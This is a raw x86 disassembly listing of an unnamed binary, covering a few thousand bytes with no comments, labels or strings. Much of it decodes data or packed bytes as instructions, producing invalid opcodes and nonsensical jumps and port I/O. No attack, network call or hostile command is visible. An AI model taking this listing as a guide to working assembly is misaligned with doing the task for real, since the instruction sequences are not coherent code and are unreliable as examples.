  40173f:	add    eax,DWORD PTR [eax]
  401741:	call   0xf6401aeb
  401746:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401747:	add    eax,DWORD PTR [eax]
  401749:	mov    fs,WORD PTR [ebp-0x5ad3fffd]
  40174f:	add    eax,DWORD PTR [eax]
  401751:	jl     0x4016f8
  401753:	add    eax,DWORD PTR [eax]
  401755:	jb     0x4016fc
  401757:	add    eax,DWORD PTR [eax]
  401759:	nop
  40175a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40175b:	add    eax,DWORD PTR [eax]
  40175d:	lods   al,BYTE PTR ds:[esi]
  40175e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40175f:	add    eax,DWORD PTR [eax]
  401761:	add    BYTE PTR [eax],al
  401763:	add    BYTE PTR [eax],al
  401765:	add    BYTE PTR [edx-0x6ffffc5c],dh
  40176b:	xchg   esp,eax
  40176c:	add    eax,DWORD PTR [eax]
  40176e:	or     BYTE PTR [edi-0x581dfffd],ah
  401774:	add    eax,DWORD PTR [eax]
  401776:	enter  0x3a7,0x0
  40177a:	int3   
  40177b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40177c:	add    eax,DWORD PTR [eax]
  40177e:	jne    0x4017f7
  401780:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401781:	add    esi,DWORD PTR [ebp-0x77]
  401784:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401785:	add    esi,DWORD PTR [ebp-0x63]
  401788:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401789:	add    esi,DWORD PTR [ebp-0x77]
  40178c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40178d:	add    esi,DWORD PTR [ebp-0x47]
  401790:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401791:	add    esi,DWORD PTR [ebp-0x55]
  401794:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401795:	add    esi,DWORD PTR [ebp-0x21]
  401798:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401799:	add    esi,DWORD PTR [ebp+0x3]
  40179c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40179d:	add    esi,DWORD PTR [ebp-0x35]
  4017a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017a1:	add    esi,DWORD PTR [ebp+0xd]
  4017a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017a5:	add    esi,DWORD PTR [ebp+0x25]
  4017a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017a9:	add    esi,DWORD PTR [ebp+0x11]
  4017ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017ad:	add    esi,DWORD PTR [ebp-0x15]
  4017b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017b1:	add    esi,DWORD PTR [ebp+0x59]
  4017b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017b5:	add    esi,DWORD PTR [ebp+0x69]
  4017b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017b9:	add    esi,DWORD PTR [ebp-0x7b]
  4017bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017bd:	add    esi,DWORD PTR [ebp-0x73]
  4017c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017c1:	add    esi,DWORD PTR [ebp+0x21]
  4017c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017c5:	add    esi,DWORD PTR [ebp+0xf]
  4017c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017c9:	add    eax,DWORD PTR [eax]
  4017cb:	add    BYTE PTR [eax],al
  4017cd:	add    BYTE PTR [eax],al
  4017cf:	jne    0x401786
  4017d1:	stos   DWORD PTR es:[edi],eax
  4017d2:	add    esi,DWORD PTR [ebp-0x6f]
  4017d5:	stos   DWORD PTR es:[edi],eax
  4017d6:	add    esi,DWORD PTR [ebp-0x5b]
  4017d9:	stos   DWORD PTR es:[edi],eax
  4017da:	add    esi,DWORD PTR [ebp-0x1f]
  4017dd:	stos   DWORD PTR es:[edi],eax
  4017de:	add    esi,DWORD PTR [ebp-0x45]
  4017e1:	stos   DWORD PTR es:[edi],eax
  4017e2:	add    esi,DWORD PTR [ebp-0x17]
  4017e5:	stos   DWORD PTR es:[edi],eax
  4017e6:	add    esi,DWORD PTR [ebp-0xd]
  4017e9:	mov    ds:0xa2d37503,al
  4017ee:	add    esi,DWORD PTR [ebp-0x23]
  4017f1:	mov    ds:0xa2f77503,al
  4017f6:	add    esi,DWORD PTR [ebp+0x7]
  4017f9:	mov    ds:0xb5027503,eax
  4017fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4017ff:	jbe    0x401803
  401801:	xchg   ebp,eax
  401802:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401803:	jbe    0x401807
  401805:	jno    0x4017ab
  401807:	jbe    0x40180b
  401809:	imul   esp,DWORD PTR [esi+esi*2+0x76a44d02],0x2
  401811:	pop    ss
  401812:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401813:	jbe    0x401817
  401815:	and    DWORD PTR [esi+esi*2+0x76a3f102],esp
  40181c:	add    dl,cl
  40181e:	mov    ds:0xa3f50276,eax
  401823:	jbe    0x401827
  401825:	out    dx,eax
  401826:	mov    ds:0x8f930276,eax
  40182b:	jbe    0x40182f
  40182d:	lea    ecx,[edi-0x705efd8a]
  401833:	add    BYTE PTR [eax],al
  401835:	add    BYTE PTR [eax],al
  401837:	add    BYTE PTR [esi+0x2],dh
  40183a:	mov    ds:0x3702768f,eax
  40183f:	(bad)  
  401840:	jbe    0x401844
  401842:	mov    ecx,DWORD PTR [edi-0x7084fd8a]
  401848:	jbe    0x40184c
  40184a:	xlat   BYTE PTR ds:[ebx]
  40184b:	mov    ?,WORD PTR [esi+0x2]
  40184e:	xlat   BYTE PTR ds:[ebx]
  40184f:	mov    ?,WORD PTR [esi+0x2]
  401852:	retf   
  401853:	mov    ?,WORD PTR [esi+0x2]
  401856:	lods   eax,DWORD PTR ds:[esi]
  401857:	mov    ?,WORD PTR [esi+0x2]
  40185a:	cmc    
  40185b:	mov    ?,WORD PTR [esi+0x2]
  40185e:	add    ecx,DWORD PTR [edi-0x70fcfd8a]
  401864:	jbe    0x401868
  401866:	repz mov ?,WORD PTR [esi+0x2]
  40186a:	adc    ecx,DWORD PTR [esi-0x582efd8a]
  401870:	jbe    0x401874
  401872:	pop    ss
  401873:	mov    ?,WORD PTR [esi+0x2]
  401876:	daa    
  401877:	mov    ?,WORD PTR [esi+0x2]
  40187a:	add    BYTE PTR ds:0x4b0000f3,bh
  401880:	jmp    0x401882
  401882:	add    BYTE PTR [ebx+0x0],bh
  401885:	add    DWORD PTR [eax],eax
  401887:	imul   edi,eax,0x0
  40188a:	add    BYTE PTR [edi-0xd],bl
  40188d:	add    BYTE PTR [eax],al
  40188f:	aaa    
  401890:	jmp    0x401892
  401892:	add    BYTE PTR ds:0xf5000103,ch
  401898:	clc    
  401899:	add    BYTE PTR [eax],al
  40189b:	add    DWORD PTR [eax],eax
  40189d:	add    BYTE PTR [eax],al
  40189f:	add    BYTE PTR [eax],al
  4018a1:	repz add BYTE PTR [eax],al
  4018a4:	aad    0xe8
  4018a6:	add    BYTE PTR [eax],al
  4018a8:	out    dx,eax
  4018a9:	add    BYTE PTR [ecx],al
  4018ab:	add    BYTE PTR [ecx-0x7effff1b],ah
  4018b1:	in     eax,0x0
  4018b3:	add    BYTE PTR [ebp-0x66ffff1b],ch
  4018b9:	add    eax,0x5410001
  4018be:	add    DWORD PTR [eax],eax
  4018c0:	inc    ebp
  4018c1:	add    eax,0x5570001
  4018c6:	add    DWORD PTR [eax],eax
  4018c8:	jecxz  0x4018af
  4018ca:	add    BYTE PTR [eax],al
  4018cc:	retf   
  4018cd:	in     eax,0x0
  4018cf:	add    BYTE PTR [edi-0x5cffff1b],bh
  4018d5:	in     eax,0x0
  4018d7:	add    ch,bh
  4018d9:	add    eax,0x40b0001
  4018de:	add    DWORD PTR [eax],eax
  4018e0:	out    0x5,eax
  4018e2:	add    DWORD PTR [eax],eax
  4018e4:	cmp    edx,ebp
  4018e6:	add    BYTE PTR [eax],al
  4018e8:	or     DWORD PTR [edx],eax
  4018ea:	add    DWORD PTR [eax],eax
  4018ec:	xor    edi,edx
  4018ee:	add    BYTE PTR [eax],al
  4018f0:	push   ecx
  4018f1:	repnz add BYTE PTR [eax],al
  4018f4:	inc    ebx
  4018f5:	jmp    0x37b:0xd6000000
  4018fc:	add    dh,ah
  4018fe:	jnp    0x401903
  401900:	add    BYTE PTR [eax],ah
  401902:	jl     0x401907
  401904:	add    BYTE PTR [eax],al
  401906:	add    BYTE PTR [eax],al
  401908:	add    BYTE PTR [eax],al
  40190a:	enter  0x37b,0x0
  40190e:	test   al,0x92
  401910:	add    eax,DWORD PTR [eax]
  401912:	adc    BYTE PTR [edx-0x6d6dfffd],0x3
  401919:	add    BYTE PTR [eax+0x1c00039a],dl
  40191f:	add    BYTE PTR [eax],al
  401921:	add    BYTE PTR [esi],ch
  401923:	mov    bh,0x3
  401925:	add    BYTE PTR [edx-0x49],cl
  401928:	add    eax,DWORD PTR [eax]
  40192a:	cmp    BYTE PTR [edi+0x1c0003],dh
  401930:	add    BYTE PTR [eax],al
  401932:	adc    al,BYTE PTR [eax]
  401934:	add    BYTE PTR [eax-0x7fffffec],al
  40193a:	push   cs
  40193b:	add    BYTE PTR [eax],al
  40193d:	and    ch,0xff
  401940:	(bad)  
  401941:	jg     0x40191f
  401943:	(bad)  
  401944:	(bad)  
  401945:	(bad)  
  401946:	ds scas eax,DWORD PTR es:[edi]
  401948:	add    eax,DWORD PTR [eax]
  40194a:	enter  0x3b0,0x0
  40194e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40194f:	mov    al,0x3
  401951:	add    ah,bl
  401953:	(bad)  
  401954:	(bad)  
  401955:	call   DWORD PTR [edx]
  401957:	mov    cl,0x3
  401959:	add    BYTE PTR [edx-0x51],ah
  40195c:	add    eax,DWORD PTR [eax]
  40195e:	stos   BYTE PTR es:[edi],al
  40195f:	(bad)  
  401960:	(bad)  
  401961:	jg     0x4019db
  401963:	scas   eax,DWORD PTR es:[edi]
  401964:	add    eax,DWORD PTR [eax]
  401966:	outs   dx,BYTE PTR ds:[esi]
  401967:	scas   eax,DWORD PTR es:[edi]
  401968:	add    eax,DWORD PTR [eax]
  40196a:	ret    0x3b0
  40196d:	add    BYTE PTR [eax],al
  40196f:	add    BYTE PTR [eax],al
  401971:	add    BYTE PTR [eax],al
  401973:	xchg   BYTE PTR [eax-0x499dfffd],dh
  401979:	add    eax,DWORD PTR [eax]
  40197b:	jne    0x401974
  40197d:	mov    bl,0x3
  40197f:	jne    0x4019b6
  401981:	mov    ah,0x3
  401983:	jne    0x4019a0
  401985:	mov    ah,0x3
  401987:	jne    0x4019ca
  401989:	mov    ah,0x3
  40198b:	jne    0x4019d2
  40198d:	mov    ah,0x3
  40198f:	jne    0x4019e2
  401991:	mov    ah,0x3
  401993:	jne    0x4019ec
  401995:	mov    bl,0x3
  401997:	jne    0x4019e2
  401999:	mov    ah,0x3
  40199b:	jne    0x4019d6
  40199d:	mov    ah,0x3
  40199f:	jne    0x4019ac
  4019a1:	mov    ah,0x3
  4019a3:	jne    0x401990
  4019a5:	mov    bl,0x3
  4019a7:	jne    0x4019a0
  4019a9:	mov    bl,0x3
  4019ab:	jne    0x401978
  4019ad:	mov    bl,0x3
  4019af:	jne    0x401994
  4019b1:	mov    bl,0x3
  4019b3:	jne    0x40193c
  4019b5:	pushf  
  4019b6:	add    esi,DWORD PTR [ebp-0x7d]
  4019b9:	pushf  
  4019ba:	add    esi,DWORD PTR [ebp-0x51]
  4019bd:	pushf  
  4019be:	add    esi,DWORD PTR [ebp-0x5b]
  4019c1:	pushf  
  4019c2:	add    esi,DWORD PTR [ebp+0x53]
  4019c5:	pushf  
  4019c6:	add    esi,DWORD PTR [ebp-0x27]
  4019c9:	add    eax,DWORD PTR [eax]
  4019cb:	jne    0x401a10
  4019cd:	mov    dl,0x3
  4019cf:	jne    0x4019aa
  4019d1:	add    eax,DWORD PTR [eax]
  4019d3:	jne    0x401992
  4019d5:	call   0x0:0x3
  4019dc:	jne    0x401991
  4019de:	call   0x7503:0x9a9b7503
  4019e5:	adc    DWORD PTR [ebx-0x64f08afd],ebx
  4019eb:	add    esi,DWORD PTR [ebp-0x21]
  4019ee:	call   0x7503:0x9ae37503
  4019f5:	sbb    ebx,DWORD PTR [ebx+0x17027503]
  4019fb:	fwait
  4019fc:	jbe    0x401a00
  4019fe:	or     DWORD PTR [ebx-0x64c6fd8a],ebx
  401a04:	jbe    0x401a08
  401a06:	ja     0x4019a2
  401a08:	jbe    0x401a0c
  401a0a:	push   ebx
  401a0b:	call   0x276:0x9a3d0276
  401a12:	and    ebx,DWORD PTR [edx-0x65e8fd8a]
  401a18:	jbe    0x401a1c
  401a1a:	aad    0x9d
  401a1c:	jbe    0x401a20
  401a1e:	xlat   BYTE PTR ds:[ebx]
  401a1f:	popf   
  401a20:	jbe    0x401a24
  401a22:	out    dx,eax
  401a23:	popf   
  401a24:	jbe    0x401a28
  401a26:	neg    DWORD PTR [ebp-0x61f2fd8a]
  401a2c:	jbe    0x401a30
  401a2e:	stc    
  401a2f:	popf   
  401a30:	jbe    0x401a34
  401a32:	cmc    
  401a33:	popf   
  401a34:	jbe    0x401a38
  401a36:	aaa    
  401a37:	popf   
  401a38:	jbe    0x401a3c
  401a3a:	inc    ebx
  401a3b:	sahf   
  401a3c:	jbe    0x401a40
  401a3e:	pop    es
  401a3f:	sahf   
  401a40:	add    BYTE PTR [eax],al
  401a42:	add    BYTE PTR [eax],al
  401a44:	add    BYTE PTR [esi+0x2],dh
  401a47:	sbb    eax,0x6502769e
  401a4c:	sahf   
  401a4d:	jbe    0x401a51
  401a4f:	pop    ebx
  401a50:	sahf   
  401a51:	jbe    0x401a55
  401a53:	pop    edi
  401a54:	sahf   
  401a55:	jbe    0x401a59
  401a57:	cmp    DWORD PTR [esi-0x6156fd8a],ebx
  401a5d:	jbe    0x401a61
  401a5f:	cmp    ebx,DWORD PTR [esi-0x61bafd8a]
  401a65:	jbe    0x401a69
  401a67:	pop    edi
  401a68:	sahf   
  401a69:	jbe    0x401a6d
  401a6b:	jecxz  0x401a0b
  401a6d:	jbe    0x401a71
  401a6f:	loope  0x401a0f
  401a71:	jbe    0x401a75
  401a73:	popa   
  401a74:	cwde   
  401a75:	jbe    0x401a79
  401a77:	add    BYTE PTR [ecx-0x3],ah
  401a7a:	add    eax,0x5eab500
  401a7f:	add    BYTE PTR [edi-0x44fffa1e],cl
  401a85:	jmp    0x5:0xe2a10005
  401a8c:	xlat   BYTE PTR ds:[ebx]
  401a8d:	or     al,BYTE PTR ds:0x502cb00
  401a93:	add    bl,dh
  401a95:	or     al,BYTE PTR ds:0x4f8a300
  401a9b:	add    BYTE PTR [ebx-0x10],ch
  401a9e:	add    al,0x0
  401aa0:	jecxz  0x401a8d
  401aa2:	add    al,0x0
  401aa4:	shl    ebx,cl
  401aa6:	add    al,0x0
  401aa8:	mov    edi,0x0
  401aad:	add    bl,bl
  401aaf:	add    al,0x0
  401ab1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ab2:	adc    eax,DWORD PTR ds:0x4d5c300
  401ab8:	add    bh,ch
  401aba:	aam    0x4
  401abc:	add    bh,dl
  401abe:	aam    0x4
  401ac0:	add    bl,bh
  401ac2:	aam    0x4
  401ac4:	add    BYTE PTR [edi],dh
  401ac6:	xlat   BYTE PTR ds:[ebx]
  401ac7:	add    al,0x0
  401ac9:	or     edx,edi
  401acb:	add    al,0x0
  401acd:	pop    ds
  401ace:	xlat   BYTE PTR ds:[ebx]
  401acf:	add    al,0x0
  401ad1:	gs adc al,0x5
  401ad4:	add    BYTE PTR [ebx+0x14],bl
  401ad7:	add    eax,0x5144900
  401adc:	add    BYTE PTR [ebx+0x3b0004fe],ch
  401ae2:	out    dx,al
  401ae3:	add    al,0x0
  401ae5:	mov    ebp,esi
  401ae7:	add    al,0x0
  401ae9:	jnp    0x401ac9
  401aeb:	add    al,0x0
  401aed:	outs   dx,DWORD PTR ds:[esi]
  401aee:	fiadd  WORD PTR [eax+eax*1]
  401af1:	aad    0xe
  401af3:	add    eax,0x8cb80000
  401af8:	add    eax,DWORD PTR [eax]
  401afa:	dec    BYTE PTR [ebx+eax*1+0x38cce00]
  401b01:	add    BYTE PTR [edx-0x7a],bh
  401b04:	add    eax,DWORD PTR [eax]
  401b06:	je     0x401a8e
  401b08:	add    eax,DWORD PTR [eax]
  401b0a:	test   BYTE PTR [ebx+eax*1+0x3a46600],cl
  401b11:	add    BYTE PTR [eax],al
  401b13:	add    BYTE PTR [eax],al
  401b15:	add    BYTE PTR [eax],al
  401b17:	je     0x401abd
  401b19:	add    eax,DWORD PTR [eax]
  401b1b:	jl     0x401ac1
  401b1d:	add    eax,DWORD PTR [eax]
  401b1f:	xchg   edx,eax
  401b20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b21:	add    eax,DWORD PTR [eax]
  401b23:	mov    fs,WORD PTR [ebx+eax*1+0x3a48c00]
  401b2a:	add    BYTE PTR [esi],cl
  401b2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b2d:	add    eax,DWORD PTR [eax]
  401b2f:	cmp    ah,BYTE PTR [ebp-0x7a19fffd]
  401b35:	add    eax,DWORD PTR [eax]
  401b37:	hlt    
  401b38:	test   DWORD PTR [ebx],eax
  401b3a:	add    al,cl
  401b3c:	test   DWORD PTR [ebx],eax
  401b3e:	add    BYTE PTR [edx+0x5a000385],bl
  401b44:	test   DWORD PTR [ebx],eax
  401b46:	add    BYTE PTR [esi+0x42000385],bh
  401b4c:	test   DWORD PTR [ebx],eax
  401b4e:	add    BYTE PTR [eax],ah
  401b50:	xchg   DWORD PTR [ebx],eax
  401b52:	add    BYTE PTR [edi+eax*4],dh
  401b55:	add    eax,DWORD PTR [eax]
  401b57:	or     ah,BYTE PTR [ebp-0x5d25fffd]
  401b5d:	add    eax,DWORD PTR [eax]
  401b5f:	lods   al,BYTE PTR ds:[esi]
  401b60:	mov    ds:0xa3240003,al
  401b65:	add    eax,DWORD PTR [eax]
  401b67:	jb     0x401b0a
  401b69:	add    eax,DWORD PTR [eax]
  401b6b:	mov    esi,0xa00003a2
  401b70:	mov    ds:0x5f750003,al
  401b75:	mov    eax,ds:0xa1737503
  401b7a:	add    eax,DWORD PTR [eax]
  401b7c:	add    BYTE PTR [eax],al
  401b7e:	add    BYTE PTR [eax],al
  401b80:	jne    0x401be9
  401b82:	mov    ds:0x3d97503,al
  401b87:	add    BYTE PTR [ebp+0xd],dh
  401b8a:	mov    dl,0x3
  401b8c:	jne    0x401bab
  401b8e:	mov    dl,0x3
  401b90:	jne    0x401bdf
  401b92:	mov    dl,0x3
  401b94:	jne    0x401c01
  401b96:	mov    dl,0x3
  401b98:	jne    0x401b1f
  401b9a:	mov    cl,0x3
  401b9c:	jne    0x401b33
  401b9e:	mov    cl,0x3
  401ba0:	jne    0x401b53
  401ba2:	mov    cl,0x3
  401ba4:	jne    0x401b51
  401ba6:	mov    cl,0x3
  401ba8:	jne    0x401b79
  401baa:	mov    cl,0x3
  401bac:	jne    0x401b8f
  401bae:	mov    cl,0x3
  401bb0:	jne    0x401b85
  401bb2:	scas   al,BYTE PTR es:[edi]
  401bb3:	add    esi,DWORD PTR [ebp-0x6b]
  401bb6:	scas   al,BYTE PTR es:[edi]
  401bb7:	add    esi,DWORD PTR [ebp-0x79]
  401bba:	scas   al,BYTE PTR es:[edi]
  401bbb:	add    esi,DWORD PTR [ebp+0x79]
  401bbe:	scas   al,BYTE PTR es:[edi]
  401bbf:	add    esi,DWORD PTR [ebp+0x73]
  401bc2:	scas   al,BYTE PTR es:[edi]
  401bc3:	add    esi,DWORD PTR [ebp+0x43]
  401bc6:	scas   eax,DWORD PTR es:[edi]
  401bc7:	add    esi,DWORD PTR [ebp+0x37]
  401bca:	scas   eax,DWORD PTR es:[edi]
  401bcb:	add    esi,DWORD PTR [ebp+0x5]
  401bce:	scas   eax,DWORD PTR es:[edi]
  401bcf:	add    esi,DWORD PTR [ebp-0x1f]
  401bd2:	scas   al,BYTE PTR es:[edi]
  401bd3:	add    esi,DWORD PTR [ebp-0x79]
  401bd6:	scas   eax,DWORD PTR es:[edi]
  401bd7:	add    esi,DWORD PTR [ebp-0x15]
  401bda:	scas   al,BYTE PTR es:[edi]
  401bdb:	add    esi,DWORD PTR [ebp-0x43]
  401bde:	scas   al,BYTE PTR es:[edi]
  401bdf:	add    esi,DWORD PTR [ebp-0x27]
  401be2:	add    eax,DWORD PTR [eax]
  401be4:	add    BYTE PTR [eax],al
  401be6:	add    BYTE PTR [eax],al
  401be8:	add    BYTE PTR [ebp-0x8],dh
  401beb:	add    eax,DWORD PTR [eax]
  401bed:	cmc    
  401bee:	retf   0x3
  401bf1:	cmc    
  401bf2:	pop    esi
  401bf3:	mov    ah,0x3
  401bf5:	jne    0x401bf9
  401bf7:	fiadd  DWORD PTR [ebx]
  401bf9:	jne    0x401b7d
  401bfb:	in     eax,0x3
  401bfd:	jne    0x401b81
  401bff:	std    
  401c00:	add    esi,DWORD PTR [ebp-0x7e]
  401c03:	out    0x3,eax
  401c05:	jne    0x401b89
  401c07:	fadd   DWORD PTR [ebx]
  401c09:	jne    0x401b8d
  401c0b:	in     al,0x3
  401c0d:	jne    0x401b91
  401c0f:	in     eax,0xaf
  401c11:	jbe    0x401c15
  401c13:	jmp    0x401bc4
  401c15:	jbe    0x401c19
  401c17:	sbb    esi,DWORD PTR [esi+esi*2+0x76b40702]
  401c1e:	add    ah,BYTE PTR [edi]
  401c20:	mov    ah,0x76
  401c22:	add    cl,BYTE PTR [ebp-0x4c]
  401c25:	jbe    0x401c29
  401c27:	fadd   QWORD PTR [ebx]
  401c29:	jne    0x401bad
  401c2b:	push   ebx
  401c2c:	mov    ah,0x76
  401c2e:	add    ch,dh
  401c30:	add    esi,DWORD PTR [ebp-0x7e]
  401c33:	push   ebp
  401c34:	mov    ah,0x76
  401c36:	add    bh,bh
  401c38:	add    esi,DWORD PTR [ebp-0x7e]
  401c3b:	push   ebp
  401c3c:	add    al,0x75
  401c3e:	cmp    cl,0x3
  401c41:	jne    0x401bc5
  401c43:	jmp    0x401c48
  401c45:	jne    0x401bc9
  401c47:	fiadd  WORD PTR [ebx]
  401c49:	jne    0x401bcd
  401c4b:	aaa    
  401c4c:	mov    bl,0x0
  401c4e:	add    BYTE PTR [eax],al
  401c50:	add    BYTE PTR [eax],al
  401c52:	jbe    0x401c56
  401c54:	cmp    DWORD PTR [esi*2+0x7503ea82],eax
  401c5b:	cmp    dl,0x3
  401c5e:	jne    0x401be2
  401c60:	in     al,dx
  401c61:	add    esi,DWORD PTR [ebp-0x7e]
  401c64:	call   0xe9c2916c
  401c69:	add    esi,DWORD PTR [ebp+0x2]
  401c6c:	std    
  401c6d:	scas   al,BYTE PTR es:[edi]
  401c6e:	jbe    0x401c72
  401c70:	jmp    FWORD PTR [esi+0x61000276]
  401c76:	and    al,BYTE PTR [edx]
  401c78:	add    BYTE PTR [ebx+0x1a],bl
  401c7b:	add    al,BYTE PTR [eax]
  401c7d:	xchg   DWORD PTR [edx],edx
  401c7f:	add    al,BYTE PTR [eax]
  401c81:	xchg   ecx,eax
  401c82:	or     al,BYTE PTR [edx]
  401c84:	add    BYTE PTR [ebx-0x72fffe1e],bl
  401c8a:	fiadd  DWORD PTR [ecx]
  401c8c:	add    BYTE PTR [edi],ch
  401c8e:	rol    BYTE PTR [ecx],cl
  401c90:	add    BYTE PTR [ecx],bl
  401c92:	retf   0x1
  401c95:	pop    ds
  401c96:	loop   0x401c99
  401c98:	add    BYTE PTR [ecx-0x26],cl
  401c9b:	add    DWORD PTR [eax],eax
  401c9d:	pop    ss
  401c9e:	rol    BYTE PTR [ecx],cl
  401ca0:	add    BYTE PTR ds:0x7b0001ca,bl
  401ca6:	and    DWORD PTR [ecx],eax
  401ca8:	add    cl,ch
  401caa:	jbe    0x401cae
  401cac:	add    BYTE PTR [ecx-0x68fffedc],dl
  401cb2:	and    al,0x1
  401cb4:	add    BYTE PTR [edi+0x0],dh
  401cba:	add    BYTE PTR [ecx+eax*1],al
  401cbd:	add    BYTE PTR [ebp+0x1000104],bh
  401cc3:	pop    es
  401cc4:	add    DWORD PTR [eax],eax
  401cc6:	icebp  
  401cc7:	add    al,0x1
  401cc9:	add    bh,bl
  401ccb:	jmp    0xe2051cd0
  401cd0:	add    BYTE PTR [eax],al
  401cd2:	mov    ch,0xe9
  401cd4:	add    BYTE PTR [eax],al
  401cd6:	jmp    0x92401f51
  401cdb:	cmc    
  401cdc:	stos   DWORD PTR es:[edi],eax
  401cdd:	ds mov al,0x95
  401ce0:	in     al,dx
  401ce1:	dec    esp
  401ce2:	dec    ecx
  401ce3:	dec    esp
  401ce4:	loope  0x401cd5
  401ce6:	add    al,0x87
  401ce8:	test   DWORD PTR ds:0xa522194d,edi
  401cee:	imul   edi,DWORD PTR [ebx-0x14],0xf939004f
  401cf5:	adc    eax,0xafc38f73
  401cfa:	push   ss
  401cfb:	shr    DWORD PTR [esi],cl
  401cfd:	rcr    DWORD PTR [edx],0xf3
  401d00:	add    bl,BYTE PTR [ebp+0x4e]
  401d03:	jecxz  0x401d29
  401d05:	cs mov cl,0xea
  401d08:	dec    ebp
  401d09:	cwde   
  401d0a:	mov    bh,0xa0
  401d0c:	aam    0x8b
  401d0e:	repz (bad) 
  401d11:	icebp  
  401d12:	inc    edx
  401d13:	aas    
  401d14:	add    ah,BYTE PTR [edi-0x22]
  401d17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d18:	or     ah,bh
  401d1a:	and    ebx,DWORD PTR [ebx]
  401d1c:	sub    BYTE PTR [esi+ebx*2+0x0],0x0
  401d21:	add    BYTE PTR [eax],al
  401d23:	add    BYTE PTR [esi-0x14],bh
  401d26:	pop    edi
  401d27:	inc    edi
  401d28:	neg    dh
  401d2a:	jmp    0xdd73:0x71968333
  401d31:	pushf  
  401d32:	xor    ebp,DWORD PTR [ecx]
  401d34:	inc    edx
  401d35:	pop    ecx
  401d36:	rcl    BYTE PTR [ecx],cl
  401d38:	sahf   
  401d39:	in     eax,dx
  401d3a:	(bad)  
  401d3b:	mov    edi,0x603e780b
  401d40:	mov    cl,0x9c
  401d42:	xor    ebp,DWORD PTR [ecx]
  401d44:	add    bl,BYTE PTR [ecx-0x2e]
  401d47:	adc    esi,ebx
  401d49:	in     al,dx
  401d4a:	(bad)  
  401d4b:	mov    edi,0x603e768b
  401d50:	mov    gs,WORD PTR [ebp+0x7]
  401d53:	cmc    
  401d54:	ins    DWORD PTR es:[edi],dx
  401d55:	mov    ds:0x97a511d3,eax
  401d5a:	add    BYTE PTR [eax],al
  401d5c:	xor    al,0xfe
  401d5e:	loope  0x401d81
  401d60:	cld    
  401d61:	sbb    DWORD PTR [eax-0x20],ecx
  401d64:	(bad)  ds:0xb4b24d9c
  401d6a:	ja     0x401dad
  401d6c:	mov    esp,0x75f795af
  401d71:	xchg   BYTE PTR [edx-0x77],bh
  401d74:	loop   0x401d13
  401d76:	mov    edx,0xd8373b32
  401d7b:	fidiv  DWORD PTR [ebx+0x7e]
  401d7e:	adc    ebx,DWORD PTR [edx]
  401d80:	(bad)  
  401d81:	xchg   ebx,eax
  401d82:	aas    
  401d83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d84:	jns    0x401dac
  401d86:	sub    eax,0x6c
  401d8b:	add    BYTE PTR [eax],al
  401d8d:	das    
  401d8e:	pushf  
  401d8f:	xchg   edx,eax
  401d90:	lahf   
  401d91:	inc    ebx
  401d92:	jmp    0x97e89b94
  401d97:	fimul  DWORD PTR [ebp+eiz*2+0x12]
  401d9b:	push   esi
  401d9c:	fdiv   DWORD PTR ds:0x86b92a45
  401da2:	sbb    eax,0x51a99bf8
  401da7:	daa    
  401da8:	push   ebp
  401da9:	fsubr  DWORD PTR [edx-0x3a]
  401dac:	dec    edx
  401dad:	cmp    ch,BYTE PTR [ebx+0xd]
  401db0:	cld    
  401db1:	imul   edi,DWORD PTR [ecx+0x2eadb76e],0x36e5dd1d
  401dbb:	dec    eax
  401dbc:	call   0x2434597c
  401dc1:	and    ebp,DWORD PTR [eax]
  401dc3:	sub    BYTE PTR ds:[edx],al
  401dc6:	inc    eax
  401dc7:	mov    esp,0x9561c465
  401dcc:	mov    ebp,0x53e653b7
  401dd1:	lea    ebx,gs:[ebx]
  401dd4:	pop    edx
  401dd5:	ja     0x401da2
  401dd7:	(bad)  
  401dd8:	shr    DWORD PTR [ebx-0x7b2e8c22],0x8e
  401ddf:	xchg   ebx,eax
  401de0:	add    BYTE PTR ds:0x12fdcc14,dh
  401de6:	pop    edx
  401de7:	popf   
  401de8:	adc    ch,BYTE PTR [ecx]
  401dea:	adc    al,0x71
  401dec:	iret   
  401ded:	add    dh,BYTE PTR fs:[ecx+0x36]
  401df1:	add    BYTE PTR [eax],al
  401df3:	add    BYTE PTR [eax],al
  401df5:	add    BYTE PTR [ebp-0x68],dh
  401df8:	jmp    0x735ec135
  401dfd:	daa    
  401dfe:	mov    al,ds:0xc4530239
  401e03:	adc    BYTE PTR [edi-0x63],dl
  401e06:	jne    0x401dca
  401e08:	cs scas al,BYTE PTR es:[edi]
